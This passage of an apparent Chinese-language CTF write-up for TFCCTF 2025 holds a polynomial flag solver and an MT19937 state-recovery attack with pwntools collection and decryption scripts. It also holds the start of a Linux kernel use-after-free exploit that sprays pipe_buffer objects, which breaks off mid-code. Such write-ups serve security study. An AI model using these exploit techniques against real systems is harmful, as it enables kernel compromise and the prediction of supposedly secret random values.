226*x2*x6 + 42*x2*x7 + 62*x2*x8 + 33*x3*x5 + 39*x3*x6 + 182*x3*x7 + 100*x3*x8 + 21*x4*x5 + 197*x4*x6 + 113*x4*x7 + 168*x4*x8 + 162*x5*x6 + 243*x5*x7 + 196*x5*x8 + 218*x6*x7 + 87*x6*x8 + 145*x7*x8</span></span><br><span class="line"><span class="comment"># P1 = 204 + 197*x1 + 178*x2 + 99*x3 + 33*x4 + 117*x5 + 57*x6 + 141*x7 + 61*x8 + 225*x1*x5 + 236*x1*x6 + 228*x1*x7 + 160*x1*x8 + 245*x2*x5 + 64*x2*x6 + 151*x2*x7 + 52*x2*x8 + 190*x3*x5 + 9*x3*x6 + 90*x3*x7 + 25*x3*x8 + 97*x4*x5 + 182*x4*x6 + 124*x4*x7 + 65*x4*x8 + 141*x5*x6 + 3*x5*x7 + 63*x5*x8 + 142*x6*x7 + 193*x6*x8 + 34*x7*x8</span></span><br><span class="line"><span class="comment"># P2 = 210 + 24*x1 + 256*x2 + 207*x3 + 244*x4 + 107*x5 + 184*x6 + 19*x7 + 180*x8 + 179*x1*x5 + 127*x1*x6 + 84*x1*x7 + 122*x1*x8 + 134*x2*x5 + 42*x2*x6 + 49*x2*x7 + 207*x2*x8 + 219*x3*x5 + 51*x3*x6 + 95*x3*x7 + 48*x3*x8 + 169*x4*x5 + 95*x4*x6 + 242*x4*x7 + 169*x4*x8 + 172*x5*x6 + 107*x5*x7 + 83*x5*x8 + 77*x6*x7 + 39*x6*x8 + 153*x7*x8</span></span><br><span class="line"><span class="comment"># P3 = 58 + 43*x1 + 101*x2 + 140*x3 + 194*x4 + 161*x5 + 110*x6 + 107*x7 + 199*x8 + 159*x1*x5 + 239*x1*x6 + 221*x1*x7 + 100*x1*x8 + 78*x2*x5 + 80*x2*x6 + 91*x2*x8 + 93*x3*x5 + 45*x3*x6 + 249*x3*x7 + 192*x3*x8 + 13*x4*x5 + 119*x4*x6 + 64*x4*x7 + 112*x4*x8 + 8*x5*x6 + 83*x5*x7 + 122*x5*x8 + 28*x6*x7 + 188*x6*x8 + 234*x7*x8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Q0= 122 + 16*x1 + 85*x2 + 46*x3 + 167*x4 + 111*x5 + 72*x6 + 162*x7 + 95*x8 + 79*x1*x5 + 150*x1*x6 + 151*x1*x7 + 126*x1*x8 + 117*x2*x5 + 25*x2*x6 + x2*x7 + 102*x2*x8 + 166*x3*x5 + 69*x3*x6 + 74*x3*x7 + 115*x3*x8 + 156*x4*x5 + 11*x4*x6 + 14*x4*x7 + 226*x4*x8 + 179*x5*x6 + 140*x5*x7 + 186*x5*x8 + 245*x6*x7 + 105*x6*x8 + 253*x7*x8</span></span><br><span class="line"><span class="comment"># Q1= 221 + 123*x1 + 148*x2 + 21*x3 + 254*x4 + 204*x5 + 255*x6 + 38*x7 + 97*x8 + 48*x1*x5 + 157*x1*x6 + 123*x1*x7 + 151*x1*x8 + 194*x2*x5 + 63*x2*x6 + 225*x2*x7 + 180*x2*x8 + 220*x3*x5 + 107*x3*x6 + 194*x3*x7 + 189*x3*x8 + 238*x4*x5 + 116*x4*x6 + 73*x4*x7 + 38*x4*x8 + 61*x5*x6 + 143*x5*x7 + 36*x5*x8 + 235*x6*x7 + 180*x6*x8 + 152*x7*x8</span></span><br><span class="line"><span class="comment"># Q2= 33 + 236*x1 + 12*x2 + 186*x3 + 244*x4 + 131*x5 + 222*x6 + 153*x7 + 67*x8 + 219*x1*x5 + 71*x1*x6 + 60*x1*x7 + 142*x1*x8 + 34*x2*x5 + 167*x2*x6 + 79*x2*x7 + 223*x2*x8 + 19*x3*x5 + 66*x3*x6 + 167*x3*x7 + 58*x3*x8 + 99*x4*x6 + 201*x4*x7 + 165*x4*x8 + 180*x5*x6 + 216*x5*x7 + 41*x5*x8 + 50*x6*x7 + 35*x6*x8 + 71*x7*x8</span></span><br><span class="line"><span class="comment"># Q3= 231 + 26*x1 + 149*x2 + 212*x3 + 62*x4 + 18*x5 + 212*x6 + 58*x7 + 191*x8 + 220*x1*x5 + 203*x1*x6 + 112*x1*x7 + 57*x1*x8 + 222*x2*x5 + 50*x2*x6 + 96*x2*x7 + 23*x2*x8 + 178*x3*x5 + 195*x3*x6 + 96*x3*x7 + 86*x3*x8 + 94*x4*x5 + 147*x4*x6 + 46*x4*x7 + 135*x4*x8 + 224*x5*x6 + 41*x5*x7 + 59*x5*x8 + 72*x6*x7 + 39*x6*x8 + 129*x7*x8</span></span><br><span class="line"></span><br><span class="line">A = matrix(Zmod(p), [[<span class="number">122</span>, <span class="number">221</span>, <span class="number">33</span>, <span class="number">231</span>], [<span class="number">16</span>, <span class="number">123</span>, <span class="number">236</span>, <span class="number">26</span>], [<span class="number">85</span>, <span class="number">148</span>, <span class="number">12</span>, <span class="number">149</span>], [<span class="number">46</span>, <span class="number">21</span>, <span class="number">186</span>, <span class="number">212</span>]])</span><br><span class="line">b1 = vector(Zmod(p), [<span class="number">122</span>, <span class="number">248</span>, <span class="number">32</span>, <span class="number">106</span>])</span><br><span class="line">b2 = vector(Zmod(p), [<span class="number">204</span>, <span class="number">197</span>, <span class="number">178</span>, <span class="number">99</span>])</span><br><span class="line">b3 = vector(Zmod(p), [<span class="number">210</span>, <span class="number">24</span>, <span class="number">256</span>, <span class="number">207</span>])</span><br><span class="line">b4 = vector(Zmod(p), [<span class="number">58</span>, <span class="number">43</span>, <span class="number">101</span>, <span class="number">140</span>])</span><br><span class="line"></span><br><span class="line">bs = [b1, b2, b3, b4]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> bs:</span><br><span class="line">    v = A.solve_right(b)</span><br><span class="line">    <span class="keyword">for</span> vi <span class="keyword">in</span> v:</span><br><span class="line">        flag += <span class="built_in">chr</span>(vi)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2><span id="why-the-bear-has-no-tail">WHY THE BEAR HAS NO TAIL</span><a href="#why-the-bear-has-no-tail" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret_stuff <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Challenge</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.n = <span class="number">2</span>**<span class="number">26</span></span><br><span class="line">        <span class="variable language_">self</span>.k = <span class="number">2000</span></span><br><span class="line">        <span class="comment"># self.words = [i for i in range(n)]</span></span><br><span class="line">        <span class="comment"># self.buf = random.choices(self.words, k=k)</span></span><br><span class="line">        <span class="variable language_">self</span>.index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_sample</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.index &gt; <span class="variable language_">self</span>.k:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Reached end of buffer&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;uhhh here is something but idk what u finna do with it: &quot;</span>, random.choices(<span class="built_in">range</span>(<span class="variable language_">self</span>.n), k=<span class="number">1</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">self</span>):</span><br><span class="line">        idxs = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">        key = random.choices(idxs, k=<span class="built_in">len</span>(FLAG))</span><br><span class="line">        omlet = [<span class="built_in">ord</span>(FLAG[i]) ^ key[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(FLAG))]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uhh ig I can give you this if you really want it... chat?&quot;</span>, omlet)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;what you finna do, huh?&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;1. guava&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;2. muava&quot;</span>)</span><br><span class="line">            choice = <span class="built_in">input</span>(<span class="string">&quot;Enter your choice: &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">                <span class="variable language_">self</span>.get_sample()</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">                <span class="variable language_">self</span>.get_flag()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Invalid choice&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    c = Challenge()</span><br><span class="line">    c.loop()</span><br></pre></td></tr></table></figure>

<p>从题目中的代码可以得到，有2000次机会可以获取一个随机数值，这个值的范围在<code>0~2^26</code>之间，即题目中的程序使用<code>random.choices(range(self.n), k=1)</code>随机获取<code>0~2^26</code>之间的一个随机值。</p>
<p>通过查看random.choices()这个函数，发现该函数会调用<code>floor(random() * n)</code>这个函数对这选择<code>0~2^26</code>这个列表中的一个数据，而<code>0~2^26</code>这个列表是按顺序排列的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [population[floor(random() * n)] <span class="keyword">for</span> i <span class="keyword">in</span> _repeat(<span class="literal">None</span>, k)]</span><br></pre></td></tr></table></figure>

<p>所以选择choice为1的时候本质上就是获得floor(random() * n)的值，接下来就需要看random()这个函数是如何生成随机数的。而Python的随机数模块使用的是MT19937算法，所以此题考察的就是MT19937算法的预测或者恢复（预测或者恢复主要是看输入choice为2的时机）。</p>
<p>通过询问AI得知，Python的random模块有些是直接使用C语言实现的，这些用C语言实现的随机数函数在编译Python解释器的时候已经被编译了，题目中的random()这个函数就是C语言实现的。所以需要到CPython相关的github仓库查看一下源码。在CPython中的这个仓库中可以找到源码 <a href="https://github.com/python/cpython/blob/main/Modules/_randommodule.c">https://github.com/python/cpython/blob/main/Modules/_randommodule.c</a></p>
<p><img src="../images/2025-TFCCTF/3.png" alt="1"></p>
<p>从源码中就可以看到random()在生成的时候相当于调用了俩次random.randbytes(32)，其中a取高27位，b取高26位。总的来说choice选择1，得到的就是floor(random() * n)的值，也就是能得到MT19937的26bit的值，但是连续选择choice1得到的26bit并不是连续的。对于已知不连续的nbit的值，本质上是线性方程组求解，求解的原理在这篇文章中情况三有比较详细的说明<a href="https://xenny.wiki/posts/crypto/PRNG/MT19937.html">MT19937分析</a>，同时这篇博客有类似的题型<a href="https://tangcuxiaojikuai.xyz/post/69eaef2e.html">https://tangcuxiaojikuai.xyz/post/69eaef2e.html</a></p>
<p>得到思路后就可以先使用脚本收集足够的数据以及密文，对于MT19937一般题型来说只需要泄露19968位数就能得到MT19937的624个状态，但是线性方程组求解使用19968位解出一般是解不出来正确结果。需要得到更多的位数。（本题测试可知已知32000位数是能得到准确的624个状态的）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">n = <span class="number">2</span>**<span class="number">26</span></span><br><span class="line">p = remote(<span class="string">&quot;the-bear-45589d3cbdcdfa7c.challs.tfcctf.com&quot;</span>,<span class="number">1337</span>,ssl=<span class="literal">True</span>)</span><br><span class="line">candidate = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1550</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;do with it:  &#x27;</span>)</span><br><span class="line">    x = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    candidate.append(<span class="built_in">int</span>(x))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;candidate =&quot;</span>,candidate)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">x = p.recvuntil(<span class="string">b&#x27;it... chat? &#x27;</span>)</span><br><span class="line">c = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,c.decode())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>对于接收到的数据，设为矩阵S，对于状态矩阵设为x，这个矩阵必然有下面的式子，而T矩阵需要构造：</p>
<p><strong>x</strong>⋅<em>T</em>&#x3D;<strong>s</strong></p>
<p>对于确定矩阵T的方法可以使用黑盒调用，也就是通过调用从而构造出来。构造出来后就可以通过矩阵运算解出状态矩阵x，注意：需要在模2的条件上解状态矩阵x。从而预测出MT19937。最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> Matrix, GF, vector</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">RNG = Random()</span><br><span class="line">n = <span class="number">2</span>^<span class="number">26</span></span><br><span class="line"><span class="comment"># 数据量1300</span></span><br><span class="line">candidate = </span><br><span class="line">c =  </span><br><span class="line">leng = <span class="built_in">len</span>(candidate)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_a_row</span>(<span class="params">RNG</span>):</span><br><span class="line">    row = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(candidate)):</span><br><span class="line">    <span class="comment"># 必须要与题目随机数生成的方式一直</span></span><br><span class="line">        row += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(RNG.choices(<span class="built_in">range</span>(n), k=<span class="number">1</span>)[<span class="number">0</span>] &gt;&gt; <span class="number">0</span>)[<span class="number">2</span>:].zfill(<span class="number">26</span>))))</span><br><span class="line">    <span class="keyword">return</span> row</span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">19968</span>):</span><br><span class="line">    state = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    temp = <span class="string">&quot;0&quot;</span>*i + <span class="string">&quot;1&quot;</span>*<span class="number">1</span> + <span class="string">&quot;0&quot;</span>*(<span class="number">19968</span>-<span class="number">1</span>-i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        state[j] = <span class="built_in">int</span>(temp[<span class="number">32</span>*j:<span class="number">32</span>*j+<span class="number">32</span>],<span class="number">2</span>)</span><br><span class="line">    RNG.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">624</span>]),<span class="literal">None</span>))</span><br><span class="line">    L.append(construct_a_row(RNG))</span><br><span class="line">L = Matrix(GF(<span class="number">2</span>),L)</span><br><span class="line">R = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(candidate)):</span><br><span class="line">    R += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(candidate[i] &gt;&gt; <span class="number">0</span>)[<span class="number">2</span>:].zfill(<span class="number">26</span>)))</span><br><span class="line">R = vector(GF(<span class="number">2</span>),R)</span><br><span class="line">s = L.solve_left(R)</span><br><span class="line">init = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>,s)))</span><br><span class="line">state = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    state.append(<span class="built_in">int</span>(init[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>],<span class="number">2</span>))</span><br><span class="line">RNG1 = Random()</span><br><span class="line">RNG1.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">624</span>]),<span class="literal">None</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng):</span><br><span class="line">    RNG1.choices(<span class="built_in">range</span>(n), k=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">idxs = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">key = RNG1.choices(idxs, k=<span class="built_in">len</span>(c))</span><br><span class="line">omlet = [c[i] ^^ key[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(omlet)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(omlet[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="slots">SLOTS</span><a href="#slots" class="header-anchor"></a></h2><p>内核baby题，UAF 漏洞  + 可以 负向 溢出</p>
<p>不是很熟悉内核的的堆，代码都是瞎几把写的，不过还是做出来了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;minilib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> VULN_DEVICE[] = <span class="string">&quot;/dev/slot_machine&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> <span class="title function_">odp</span><span class="params">(<span class="type">char</span> *path)</span>&#123; <span class="keyword">return</span> open(path, <span class="number">2</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mytest</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> page;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">size_t</span> ops;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rm</span><span class="params">()</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">size_t</span> size)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> sz = size;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, (<span class="type">size_t</span>)&amp;sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">size_t</span> o, <span class="type">size_t</span> s, <span class="type">char</span> *b)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mytest</span> <span class="title">temp</span> =</span> &#123;</span><br><span class="line">        .offset = o,</span><br><span class="line">        .size = s,</span><br><span class="line">        .buf = b</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, <span class="number">1337</span>, (<span class="type">size_t</span>)&amp;temp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">size_t</span> o, <span class="type">size_t</span> s, <span class="type">char</span> *b)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mytest</span> <span class="title">temp</span> =</span> &#123;</span><br><span class="line">        .offset = o,</span><br><span class="line">        .size = s,</span><br><span class="line">        .buf = b</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, <span class="number">3</span>, (<span class="type">size_t</span>)&amp;temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pfd[<span class="number">2</span>])</span> &#123; <span class="keyword">return</span> syscall64(<span class="number">22</span>, pfd); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doMain</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    fd = odp(VULN_DEVICE);</span><br><span class="line">    lss(<span class="string">&quot;fd&quot;</span>, fd);</span><br><span class="line">    <span class="type">size_t</span> *ptr = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">void</span>*)ptr, <span class="number">0x41</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pfd[<span class="number">0x100</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x80</span>;i++)&#123;</span><br><span class="line">        pipe(pfd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x400</span>);</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x10</span>,(<span class="type">char</span>*)ptr);</span><br><span class="line">    rm();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0x80</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        pipe(pfd[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *tmp_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">void</span>*)tmp_buf, <span class="number">0x59</span>, <span class="number">0xFFF</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0x81</span>;i&lt;<span class="number">0x100</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        write(pfd[i][<span class="number">1</span>],tmp_buf,<span class="number">0x800</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *out = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        tmp = i;</span><br><span class="line">        show(<span class="number">-0x400</span>*i,<span class="number">1</span> + <span class="number">0x400</span>*i,(<span class="type">char</span>*)out);</span><br><span class="line">        <span class="keyword">if</span>(out[<span class="number">0</span>])&#123;</span><br><span class="line">            